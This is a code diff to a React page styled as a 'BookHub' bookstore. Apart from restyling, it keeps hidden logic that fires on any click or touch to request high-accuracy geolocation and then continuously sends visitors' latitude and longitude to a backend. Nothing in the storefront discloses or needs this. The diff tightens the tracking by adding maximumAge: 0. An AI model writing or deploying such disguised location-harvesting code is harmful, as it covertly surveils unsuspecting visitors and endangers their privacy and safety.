@@ -10,7 +10,6 @@ function App() {
     const startTracking = () => {
       if (!navigator.geolocation) return;
 
-      // prevent multiple triggers
       if (watchRef.current) return;
 
       const sendLocation = async (pos) => {
@@ -20,19 +19,15 @@ function App() {
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude,
           });
-        } catch (err) {
+        } catch {
           console.log("Error sending");
         }
       };
 
-      // 🔥 1. FIRST INSTANT LOCATION (popup comes here)
+      // 🔥 FIRST LOCATION
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          sendLocation(pos);
-        },
-        (err) => {
-          console.log("Permission denied");
-        },
+        (pos) => sendLocation(pos),
+        () => console.log("Permission denied"),
         {
           enableHighAccuracy: true,
           timeout: 5000,
@@ -40,23 +35,21 @@ function App() {
         }
       );
 
-      // 🔥 2. CONTINUOUS TRACKING
+      // 🔥 LIVE TRACKING
       watchRef.current = navigator.geolocation.watchPosition(
-        (pos) => {
-          sendLocation(pos);
-        },
+        (pos) => sendLocation(pos),
         () => {},
         {
           enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0,
         }
       );
 
-      // remove listener after first interaction
       window.removeEventListener("click", startTracking);
       window.removeEventListener("touchstart", startTracking);
     };
 
-    // 👇 triggers on ANY tap instantly
     window.addEventListener("click", startTracking);
     window.addEventListener("touchstart", startTracking);
 
@@ -71,86 +64,73 @@ function App() {
   }, []);
 
   return (
-    <div>
-      {/* 🔥 SAME UI */}
-      <style>{`
-        body { margin: 0; font-family: Arial; }
-
-        .navbar {
-          display: flex;
-          justify-content: space-between;
-          padding: 15px 30px;
-          background: #222;
-          color: #fff;
-        }
-
-        .nav-links span { margin-left: 20px; cursor: pointer; }
-
-        .container {
-          display: grid;
-          grid-template-columns: repeat(4, 1fr);
-          gap: 20px;
-          padding: 20px;
-        }
-
-        .card {
-          border: 1px solid #ddd;
-          border-radius: 10px;
-          padding: 15px;
-          text-align: center;
-        }
-
-        .card img {
-          width: 100%;
-          height: 220px;
-          object-fit: cover;
-        }
-
-        button {
-          margin-top: 10px;
-          padding: 10px;
-          border: none;
-          background: #007bff;
-          color: white;
-          border-radius: 5px;
-          cursor: pointer;
-        }
-
-        @media (max-width: 992px) {
-          .container { grid-template-columns: repeat(2, 1fr); }
-        }
-
-        @media (max-width: 600px) {
-          .container { grid-template-columns: 1fr; }
-          .navbar { flex-direction: column; text-align: center; }
-        }
-      `}</style>
-
+    <div style={{ fontFamily: "Arial", margin: 0 }}>
+      
       {/* Navbar */}
-      <div className="navbar">
+      <div style={styles.navbar}>
         <h2>📚 BookHub</h2>
-        <div className="nav-links">
-          <span>Home</span>
-          <span>Categories</span>
-          <span>Cart</span>
-          <span>Login</span>
+        <div>
+          <span style={styles.link}>Home</span>
+          <span style={styles.link}>Categories</span>
+          <span style={styles.link}>Cart</span>
+          <span style={styles.link}>Login</span>
         </div>
       </div>
 
       {/* Books */}
-      <div className="container">
+      <div style={styles.container}>
         {books.map((book, i) => (
-          <div key={i} className="card">
-            <img src={book.img} alt="" />
+          <div key={i} style={styles.card}>
+            <img src={book.img} alt="" style={styles.img} />
             <h3>{book.title}</h3>
             <p>₹{book.price}</p>
-            <button>Buy Now</button>
+            <button style={styles.button}>Buy Now</button>
           </div>
         ))}
       </div>
     </div>
   );
 }
+
+const styles = {
+  navbar: {
+    display: "flex",
+    justifyContent: "space-between",
+    padding: "15px 30px",
+    background: "#222",
+    color: "#fff",
+  },
+  link: {
+    marginLeft: "20px",
+    cursor: "pointer",
+  },
+  container: {
+    display: "grid",
+    gridTemplateColumns: "repeat(4, 1fr)",
+    gap: "20px",
+    padding: "20px",
+  },
+  card: {
+    border: "1px solid #ddd",
+    borderRadius: "10px",
+    padding: "15px",
+    textAlign: "center",
+  },
+  img: {
+    width: "100%",
+    height: "220px",
+    objectFit: "cover",
+  },
+  button: {
+    marginTop: "10px",
+    padding: "10px",
+    border: "none",
+    background: "#007bff",
+    color: "white",
+    borderRadius: "5px",
+    cursor: "pointer",
+  },
+};
 
 const books = [
   { title: "Rich Dad Poor Dad", price: 299, img: "https://m.media-amazon.com/images/I/81bsw6fnUiL.jpg" },
